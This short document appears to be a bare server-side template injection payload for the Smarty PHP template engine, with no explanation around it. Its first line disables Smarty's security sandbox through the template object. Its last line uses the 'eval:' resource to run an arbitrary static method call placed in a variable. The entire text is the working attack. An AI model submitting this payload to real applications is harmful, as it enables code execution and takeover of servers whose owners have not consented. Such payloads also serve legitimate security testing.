{$name=$smarty.template_object->disableSecurity()}
{$template="myclass::method()"}
{include file="eval:{$smarty.ldelim}{$template}{$smarty.rdelim}"}
